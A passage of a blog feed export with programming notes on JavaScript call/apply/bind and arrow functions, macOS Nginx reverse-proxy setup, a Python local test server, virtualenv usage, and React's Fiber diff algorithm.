<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cachingDecorator</span>(<span class="params">func, hash</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cache = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> key = hash(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (cache.has(key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = func.call(<span class="built_in">this</span>, ...arguments);</span><br><span class="line">    </span><br><span class="line">    cache.set(key, result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args[<span class="number">0</span>] + <span class="string">&#x27;, &#x27;</span> + args[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">worker.slow = cachingDecorator(worker.slow, hash);</span><br><span class="line"><span class="built_in">console</span>.log(worker.slow(<span class="number">1</span>,<span class="number">2</span>)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<h2 id="function-apply"><a href="#function-apply" class="headerlink" title="function.apply"></a><code>function.apply</code></h2><p><strong>语法：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>.apply(context, args)</span><br></pre></td></tr></table></figure>
<p><code>function.apply</code>与<code>function.call</code>类似，参数<code>context</code>用于设定<code>this</code>，<strong>唯一的区别在于传入<code>apply</code>的<code>args</code>必须为一个类数组对象，而传入<code>call</code>的<code>arg1, arg2, ...</code>必须为一个参数列表。</strong></p>
<p><strong>Tips：</strong></p>
<ul>
<li>使用Spread语法<code>...</code>可以将**可迭代对象<code>args</code>**展开为参数列表传递给<code>call</code></li>
<li><code>apply</code>仅接受<strong>类数组对象<code>args</code></strong></li>
</ul>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">func.call(context, ...args);</span><br><span class="line">func.apply(context, args);</span><br></pre></td></tr></table></figure>
<p>其中<code>args</code>为数组</p>
<h2 id="方法借用"><a href="#方法借用" class="headerlink" title="方法借用"></a>方法借用</h2><p>如上类哈希函数只适用于2个参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> args[<span class="number">0</span>] + <span class="string">&#x27;, &#x27;</span> + args[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单并理想的方法是使用<code>.join()</code>方法，但是尽管<code>args</code>对象是可迭代和类数组对象，但是它不是真正的数组。<strong>因此，使用<code>args.join()</code>会报错。</strong></p>
<p><strong>使用方法借用可以解决这个问题：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].join.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="装饰器和函数属性"><a href="#装饰器和函数属性" class="headerlink" title="装饰器和函数属性"></a>装饰器和函数属性</h2><p>通常，用装饰的函数/方法去替换原函数/方法是安全的，但是<strong>如果原函数有属性，如<code>func.calledCount</code>，则装饰后的函数不会具有该属性。</strong></p>
<h1 id="函数绑定"><a href="#函数绑定" class="headerlink" title="函数绑定"></a>函数绑定</h1><p>问题：当将对象方法作为回调进行传递，经常会出现“丢失<code>this</code>“的问题</p>
<h2 id="丢失this"><a href="#丢失this" class="headerlink" title="丢失this"></a>丢失<code>this</code></h2><p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(user.sayHi, <span class="number">1000</span>); <span class="comment">// &#x27;Hello, undefined&#x27;</span></span><br></pre></td></tr></table></figure>
<p>其中，浏览器中的<code>setTimeout</code>方法有些特殊，它会为函数调用设定<code>this=window</code>，因为它其实是在获取<code>window.firstName</code>。在其他类似情况下，<code>this</code>通常会被设定为<code>undefined</code>。</p>
<blockquote>
<p>那么想将一个对象方法传递到别的地方，然后在该位置进行调用，如何才能确保在正确的上下文中调用它呢？</p>
</blockquote>
<h2 id="解决方案1—包装器"><a href="#解决方案1—包装器" class="headerlink" title="解决方案1—包装器"></a>解决方案1—包装器</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  user.sayHi(); <span class="comment">// &#x27;Hello, John!&#x27;</span></span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p>也可以使用箭头函数，但更简洁</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> user.sayHi(), <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><strong>但是，</strong>如果user的内容在setTimeout中的函数执行前改变了，那么就会发生错误，**使用<code>bind</code>可以避免这样的问题</p>
<h2 id="解决方案2—bind"><a href="#解决方案2—bind" class="headerlink" title="解决方案2—bind"></a>解决方案2—bind</h2><p><em><strong>内建方法<code>bind</code>可以帮助函数绑定<code>this</code></strong></em></p>
<p>基本语法如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.bind(context);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  firstName: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="title">sayHi</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;<span class="built_in">this</span>.firstName&#125;</span>!`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sayHi = user.sayHi.bind(user);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(sayHi, <span class="number">1000</span>); <span class="comment">// &#x27;Hello, John!&#x27;</span></span><br><span class="line"></span><br><span class="line">user = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="偏函数—Partial-functions"><a href="#偏函数—Partial-functions" class="headerlink" title="偏函数—Partial functions"></a>偏函数—Partial functions</h2><p><code>bind</code>的完整语法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.bind(context, arg1, arg2, ...);</span><br></pre></td></tr></table></figure>
<p><code>bind</code>允许将上下文绑定为<code>this</code>，以及绑定函数的起始参数（即设定某个参数的输入值且不可修改）</p>
<p>例如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mul</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> double = mul.bind(<span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(double(<span class="number">3</span>)); <span class="comment">// 3*2=6</span></span><br><span class="line"><span class="built_in">console</span>.log(double(<span class="number">4</span>)); <span class="comment">// 4*2=8</span></span><br></pre></td></tr></table></figure>
<h1 id="深入理解箭头函数"><a href="#深入理解箭头函数" class="headerlink" title="深入理解箭头函数"></a>深入理解箭头函数</h1><p>JS的精髓之一是在于创建一个函数并将其传递到某个地方再执行。在这种情况下，我们通常不想离开当前的上下文，此时箭头函数就显得很方便了</p>
<h2 id="箭头函数没有”this”"><a href="#箭头函数没有”this”" class="headerlink" title="箭头函数没有”this”"></a>箭头函数没有”this”</h2><p><strong>箭头函数没有<code>this</code>，如果要访问<code>this</code>，则会从外部获取。</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> group = &#123;</span><br><span class="line">  title: <span class="string">&#x27;JS-Squad&#x27;</span>,</span><br><span class="line">  students: [<span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;Dion&#x27;</span>, <span class="string">&#x27;Akshay&#x27;</span>],</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="title">showList</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.students.forEach(</span><br><span class="line">    student =&gt; <span class="built_in">console</span>.log(<span class="built_in">this</span>.title + <span class="string">&#x27;: &#x27;</span> + student))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">group.showList(); <span class="comment">// &#x27;JS-Squad: Will&#x27; ...</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>forEach</code>种使用了箭头函数，因此会从外部获取<code>this</code>，该<code>this</code>为<code>group</code>，所以就是<code>group.title</code>。</p>
<h2 id="箭头函数没有”arguments”"><a href="#箭头函数没有”arguments”" class="headerlink" title="箭头函数没有”arguments”"></a>箭头函数没有”arguments”</h2><p><em><strong>同时，箭头函数也没有<code>arguments</code>变量。</strong></em>因此当我们（常见，在装饰器中）需要使用当前的<code>this</code>和<code>arguments</code>转发一个调用时，可以使用如下写法：</p>
<p>其中：<code>defer</code>获得一个函数，然后返回一个包装器。</p>
<p><strong>箭头函数版：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defer</span>(<span class="params">f, ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> f.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>), ms)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">who</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Hello, <span class="subst">$&#123;who&#125;</span>!`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sayHiDefer = defer(sayHi, <span class="number">2000</span>);</span><br><span class="line">sayHiDefer(<span class="string">&#x27;John&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>非箭头函数版：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">def</span>(<span class="params">f, ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> ctx = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> f.apply(ctx, args)</span><br><span class="line">    &#125;, ms);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时，需要创建<code>ctx</code>和<code>args</code>，以便<code>setTimeout</code>内部的函数可以获取它们。</p>
<h1 id="补充之前"><a href="#补充之前" class="headerlink" title="补充之前"></a>补充之前</h1><p><strong>for loop</strong></p>
<ul>
<li><em><strong>for/in</strong></em> - loops through the properties of an object</li>
<li><em><strong>for/of</strong></em>- loops through the values of an iterable object</li>
</ul>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>基于MAC的NGINX配置使用---反向代理解决跨域</title>
    <url>/2021/10/19/NignxConfig/</url>
    <content><![CDATA[<p><strong>关于Engine X（即Nignx）代理服务器配置说明</strong></p>
<a id="more"></a>

<h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><ol>
<li><p>Terminal执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew search nginx</span><br><span class="line">brew install nginx</span><br></pre></td></tr></table></figure></li>
<li><p>安装完成后，Terminal输出信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docroot is: &#x2F;usr&#x2F;local&#x2F;var&#x2F;www</span><br><span class="line"></span><br><span class="line">The default port has been set in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf to 8080 so that</span><br><span class="line">nginx can run without sudo.</span><br><span class="line"></span><br><span class="line">nginx will load all files in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;.</span><br><span class="line"></span><br><span class="line">To start nginx:</span><br><span class="line">  brew services start nginx</span><br><span class="line">Or, if you don&#39;t want&#x2F;need a background service you can just run:</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g &#39;daemon off;&#39;</span><br></pre></td></tr></table></figure>
<h1 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h1></li>
<li><p>第一次安装后启动nginx，Terminal执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start nginx</span><br></pre></td></tr></table></figure>
<p>以后再次启动nginx只需执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nginx</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>如果出现不成功的情况，可采取以下方法：先结束主进程再重启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ax | grep nginx # 查看进程号</span><br><span class="line">sudo kill -s QUIT 主进程ID号</span><br><span class="line">sudo nginx</span><br></pre></td></tr></table></figure></li>
<li><p>访问Nginx默认端口8080</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localhost:8080</span><br></pre></td></tr></table></figure></li>
<li><p>其他常用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -s stop # 停止nginx</span><br><span class="line">nginx -s reload # 重启nginx</span><br><span class="line">nginx # 启动nginx</span><br></pre></td></tr></table></figure></li>
<li><p>配置<code>nginx.conf</code>文件</p>
<ul>
<li><p>进入Finder，按住<code>shift</code>+<code>command</code>+G，然后搜索<code>local/etc</code>，找到nginx文件夹</p>
</li>
<li><p>找到nginx.conf文件，进入修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen: 80; &#x2F;&#x2F; 默认80端口，选择一个未被使用的接口即可</span><br><span class="line">	server_name: localhost;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourfronend.com; &#x2F;&#x2F; 此处为你浏览器所在的地址</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;api&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourbackend.com; &#x2F;&#x2F; 此处为你浏览器所请求的地址</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>保存文件，重启Nginx</p>
</li>
<li><p>访问Nignx的监听端口，本例为<code>http://localhost:80</code></p>
</li>
<li><p>你会看到前端地址所在的内容</p>
</li>
<li><p>进行跨域测试</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>ClientServer</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Python设置本地测试服务器</title>
    <url>/2021/09/16/Python-localServer/</url>
    <content><![CDATA[<p><strong>关于使用Python搭建简易本地服务器指南，可用于异步测试等。</strong></p>
<a id="more"></a>

<h2 id="测试本地文件的问题"><a href="#测试本地文件的问题" class="headerlink" title="测试本地文件的问题"></a>测试本地文件的问题</h2><ul>
<li><strong>它们具有异步请求功能</strong>。如果您只是从本地文件运行示例，某些浏览器（包括 Chrome）将不会运行异步请求。这是因为安全限制。</li>
<li><strong>它们具有服务器端语言</strong>。服务器端语言（例如 PHP 或 Python）需要一个特殊的服务器来解释代码并交付结果。</li>
</ul>
<h2 id="利用Python建立简单本地HTTP服务器"><a href="#利用Python建立简单本地HTTP服务器" class="headerlink" title="利用Python建立简单本地HTTP服务器"></a>利用Python建立简单本地HTTP服务器</h2><ul>
<li><p>安装Python</p>
</li>
<li><p>运行命令行（我是mac），输入以下命令检查是否安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure></li>
<li><p>cd到目标文件目录</p>
</li>
<li><p>启动服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></li>
<li><p>默认端口号是8000，通过localhost:8000来访问此服务器</p>
</li>
<li><p><strong>PS:</strong> 切换端口号使用如下命令（以7800端口号为例）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7800</span><br></pre></td></tr></table></figure></li>
</ul>
<p><em><strong>最后， Python的http.server只是静态文件服务器，他无法运行python、php、javascript等语言的代码，所以要在本地运行服务器端语言代码，可以使用Python Web框架，比如Django等</strong></em></p>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Python virtualenv notes</title>
    <url>/2021/02/20/Pythonvirtualenvnotes/</url>
    <content><![CDATA[<h1 id="Python3-virtual-environment-construction"><a href="#Python3-virtual-environment-construction" class="headerlink" title="Python3 virtual environment construction"></a>Python3 virtual environment construction</h1><a id="more"></a>

<h2 id="1-Perface"><a href="#1-Perface" class="headerlink" title="1. Perface"></a>1. Perface</h2><ul>
<li><h3 id="Why-do-we-need-virtual-environment"><a href="#Why-do-we-need-virtual-environment" class="headerlink" title="Why do we need virtual environment"></a>Why do we need virtual environment</h3><p>Simply put, an individual virtual environment can be used by an individual python project so that every project won’t affect each other and also won’t affect the python system environment.</p>
</li>
<li><h3 id="Why-do-we-use-‘virtualenv’"><a href="#Why-do-we-use-‘virtualenv’" class="headerlink" title="Why do we use ‘virtualenv’"></a>Why do we use ‘virtualenv’</h3><p>In short, it’s the python official recommendation.</p>
</li>
</ul>
<hr>
<h2 id="2-Install-virtualenv"><a href="#2-Install-virtualenv" class="headerlink" title="2. Install virtualenv"></a>2. Install virtualenv</h2><p><em>PS: My laptop is MacBook, so the following procedure is based on the macbook terminal.</em></p>
<ol>
<li><p>Before installing, you should make sure you’ve already installed pip, and then use pip to install env.  </p>
<blockquote>
<p>pip3 install virtualenv</p>
</blockquote>
</li>
<li><p>Check if the installation is successful  </p>
<blockquote>
<p>virtualenv –version</p>
</blockquote>
</li>
<li><p>Create the big virtual environment  </p>
<p>Firstly, you should ‘cd’ to the directory where you wanna create VE(virtual environment)</p>
<blockquote>
<p> virtualenv envname #Here you should give your virtual environment name</p>
</blockquote>
<p>The environment will also install Python setuptools, pip, wheel automatically</p>
</li>
<li><p>Activate your environment</p>
<blockquote>
<p>Source bigenvname/bin/activate</p>
</blockquote>
</li>
<li><p>Extra procedure</p>
<p>For me, I often use terminal to start the editor, so when you activate the environment, Use ‘cd’ to the directory where you wanna store your code file. And then start jupyter notebook.</p>
<blockquote>
<p>jupyter notebook</p>
</blockquote>
<p>So now you can code in the envname virtual environment.</p>
</li>
</ol>
<hr>
<h2 id="3-Install-virtualenvwrapper"><a href="#3-Install-virtualenvwrapper" class="headerlink" title="3. Install virtualenvwrapper"></a>3. Install virtualenvwrapper</h2><p>*Note: Sometimes, we may create more than one VE, and we’d like to swap between the different VE. Hence, we need the command ‘workon’ which is belong to the package virtualenvwrapper. </p>
<ol>
<li><p>Install VEW. </p>
<blockquote>
<p>pip3 install virtualenvwrapper</p>
</blockquote>
</li>
<li><p>Configure VEW. </p>
<blockquote>
<p>export WORKON_HOME=’your sub-VE address’</p>
<p>source /usr/local/bin/virtualenvwrapper.sh  // execute the command package</p>
</blockquote>
<p>But what if your address is not the above default address, how could you find it? I faced the same problem before. We can try to uninstall the package ‘virtualenvwrapper’ and it will prompt us all the files address we would delete.</p>
<p>![截屏2021-02-20 13.24.51](/Users/arieskoo/Library/Application Support/typora-user-images/截屏2021-02-20 13.24.51.png)</p>
</li>
<li><p>After configuring all the environment parameters, we s=also need to execute source command to make it work. </p>
<blockquote>
<p>source ~/.bash_profile</p>
</blockquote>
</li>
</ol>
<hr>
<h2 id="4-Use-VEW-to-create-sub-environment"><a href="#4-Use-VEW-to-create-sub-environment" class="headerlink" title="4.  Use VEW to create sub-environment"></a>4.  Use VEW to create sub-environment</h2><ol>
<li><p>create sub-env</p>
<blockquote>
<p>makvirtualenv env01(envname)</p>
</blockquote>
<p>The default address is under the previous export WORKON_HOME=’your sub-VE address’.</p>
</li>
<li><p>Query the list of VE</p>
<blockquote>
<p>lsvirtualenv -b</p>
</blockquote>
</li>
<li><p>query the python pakcages</p>
<blockquote>
<p>lssitepackages</p>
</blockquote>
</li>
<li><p>exchange the sub-VE</p>
<blockquote>
<p>workon envname</p>
</blockquote>
</li>
<li><p>Remove sub-VE</p>
<blockquote>
<p>rmvirtualenv envname</p>
</blockquote>
</li>
<li><p>Install python packages in the sub-VE</p>
<blockquote>
<p>pip install packagename</p>
</blockquote>
</li>
<li><p>exit the sub-VE</p>
<blockquote>
<p>deactivate</p>
</blockquote>
</li>
<li><p>How to start VE every time start the PC</p>
<p>Since you totally exit the VE, you need to reactivate the big VE every time you wanna reenter it.</p>
<blockquote>
<p>cd big VE address</p>
<p>source bigenvname/bin/activate</p>
<p>workon sub-VEname</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>virtualenv</tag>
      </tags>
  </entry>
  <entry>
    <title>React进阶之路——Diff算法详解</title>
    <url>/2022/08/02/ReactDiff%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p><strong>React Fiber</strong> 是 React 16 之后推出的新架构，而 <strong>Reconciliation</strong> 是 React 的 Diff 算法，<strong>Fiber 和 Reconciliation 都是 React 的核心机制</strong>。因此了解和认识其核心机制的运作以及原理，对我们今后高效使用 React 大有裨益。</p>
<a id="more"></a>

<h1 id="React-Diff-算法"><a href="#React-Diff-算法" class="headerlink" title="React Diff 算法"></a>React Diff 算法</h1><h2 id="1-DOM-Virtual-DOM-Fiber"><a href="#1-DOM-Virtual-DOM-Fiber" class="headerlink" title="1. DOM, Virtual DOM, Fiber"></a>1. DOM, Virtual DOM, Fiber</h2><h3 id="1-1-DOM"><a href="#1-1-DOM" class="headerlink" title="1.1 DOM"></a>1.1 DOM</h3><p>在 DOM 树上，当有很多 DOM 节点元素需要更新时，浏览器会重新渲染所有的样式和 HTML 元素。</p>
<h3 id="1-2-Virtual-DOM"><a href="#1-2-Virtual-DOM" class="headerlink" title="1.2 Virtual DOM"></a>1.2 Virtual DOM</h3><p>Virtual DOM 的出现就是为了解决这一问题，Virtual DOM 是真实 DOM 的模拟，真实 DOM 树由真实的 DOM 元素组成，而 Virtual DOM 树是由 Virtual DOM 元素（即 React Element）组成。当 React 组件状态发生变化时，会产生一个新的 Virtual DOM 树，然后 React 会利用 diff 算法对新旧两棵  Virtual DOM 树进行比较，找到差异，并将差异更新到真实的 DOM 树上，从而完成 DOM 节点元素的更新。</p>
<p>React Element:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> type ReactElement = &#123;|</span><br><span class="line">  $$typeof: any,</span><br><span class="line">  type: any,</span><br><span class="line">  key: any,</span><br><span class="line">  ref: any,</span><br><span class="line">  props: any,</span><br><span class="line">  <span class="comment">// ReactFiber</span></span><br><span class="line">  _owner: any,</span><br><span class="line">  ...</span><br><span class="line">|&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-Fiber-对象"><a href="#1-3-Fiber-对象" class="headerlink" title="1.3 Fiber 对象"></a>1.3 Fiber 对象</h3><p>每个 React Element 被创建的同时，都会创建一个 fiber node （fiber node 为 fiber 对象的实例）与之相关联。</p>
<p>Fiber 对象是一个<strong>数据结构</strong>，用于保存组件状态、组件对应的 DOM 信息、以及工作任务。值得注意的是，和 react element 不一样，fiber node 不需要在每次页面状态更新时都重新创建一遍。在执行 Reconciliation 算法期间，组件 render 方法所返回的 react element 信息都会被合并到对应的 fiber node 中。</p>
<p>Fiber 对象：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> type Fiber = &#123;|</span><br><span class="line">    tag: WorkTag;</span><br><span class="line">    key: <span class="literal">null</span> | string;</span><br><span class="line">    type: any;</span><br><span class="line">    stateNode: any;</span><br><span class="line">    updateQueue: mixed;</span><br><span class="line">    memoizedState: any;</span><br><span class="line">    memoizedProps: any,</span><br><span class="line">    pendingProps: any;</span><br><span class="line">    nextEffect: Fiber | <span class="literal">null</span>,</span><br><span class="line">    firstEffect: Fiber | <span class="literal">null</span>,</span><br><span class="line">    lastEffect: Fiber | <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">return</span>: Fiber | <span class="literal">null</span>;</span><br><span class="line">    child: Fiber | <span class="literal">null</span>;</span><br><span class="line">    sibling: Fiber | <span class="literal">null</span>;</span><br><span class="line">    ...</span><br><span class="line">|&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="2-React-核心工作流"><a href="#2-React-核心工作流" class="headerlink" title="2. React 核心工作流"></a>2. React 核心工作流</h2><ol>
<li>任务调度器 Scheduler: 决定组件渲染的优先级</li>
<li>协调器 Reconciler: 比较并找出新旧两棵 Virtual DOM 树的差异，并把差异告诉 Renderer</li>
<li>渲染器 Renderer: 将差异更新到真实 DOM上</li>
</ol>
<p>组件 ———&gt; 任务调度器（Scheduler）<strong>决定高优先级任务</strong>———&gt; 调和器（Reconciler）<strong>新旧两棵 Virtual DOM 树差异比较</strong>———&gt; 渲染器（Renderer）———&gt; <strong>将差异更新到真实 DOM 树上</strong></p>
<h2 id="3-Reconciliation"><a href="#3-Reconciliation" class="headerlink" title="3. Reconciliation"></a>3. Reconciliation</h2><p>在使用 React 时，组件会被渲染成一棵 React Element 树，当组件状态发生变化时，组件会被再次渲染并生成一棵新的不同的 React Element 树。此时，React 会使用 Diff 算法去高效地更新真实的 DOM 树。这个 Diff 算法就是 Reconciliation 算法。</p>
<p>Reconciliation 算法主要做了两件事：</p>
<ul>
<li><strong>找出两棵 React Element 树的差异</strong></li>
<li><strong>将差异更新到真实 DOM 树上</strong></li>
</ul>
<h3 id="3-1-Stack-Reconciler-栈调和器"><a href="#3-1-Stack-Reconciler-栈调和器" class="headerlink" title="3.1 Stack Reconciler 栈调和器"></a>3.1 Stack Reconciler 栈调和器</h3><p>React 15.x 以及之前的版本的 Reconciliation 算法都采用了 Stack Reconciler 来实现，但这个时期的栈调和器存在一些缺陷，例如<strong>不能暂停渲染任务</strong>、<strong>不能切分任务</strong>、<strong>无法有效平衡组件更新渲染和动画相关任务的执行顺序（即不能划分任务的优先级，这可能会导致重要任务卡顿和动画掉帧等问题）</strong>。</p>
<h3 id="3-2-Fiber-Reconciler"><a href="#3-2-Fiber-Reconciler" class="headerlink" title="3.2 Fiber Reconciler"></a>3.2 Fiber Reconciler</h3><p>Fiber Reconciler 解决了一些 Stack Reconciler 中的固有问题，在 React 16 版本推出了全新的 Reconciliation 算法调和器——Fiber 调和器来替代栈调和器。Fiber Reconciler 会<strong>利用 Scheduler （调度器）来帮忙处理组件的渲染和更新工作</strong>。此外，每棵 react element tree 都有<strong>一棵对应的 fiber node tree</strong>。在 diff 两棵 react element tree 的差异时，<strong>Fiber Reconciler 会基于 fiber node tree 来使用 diff 算法</strong>，通过 fiber node 的 <strong>return, child, sibling 等属性</strong>能更方便地<strong>遍历 fiber node tree</strong>，从而更高效地完成 diff 算法。</p>
<h3 id="3-3-Fiber-Reconciler-优点"><a href="#3-3-Fiber-Reconciler-优点" class="headerlink" title="3.3 Fiber Reconciler 优点"></a>3.3 Fiber Reconciler 优点</h3><ol>
<li>能够把可中断的任务<strong>切片处理</strong></li>
<li>能够<strong>调整任务优先级</strong>，重置并复用任务</li>
<li>可以在父子组件任务间前进后退切换任务</li>
<li>render 方法可以<strong>返回多个元素</strong>（即数组）——Fragments</li>
<li>支持异常边界处理</li>
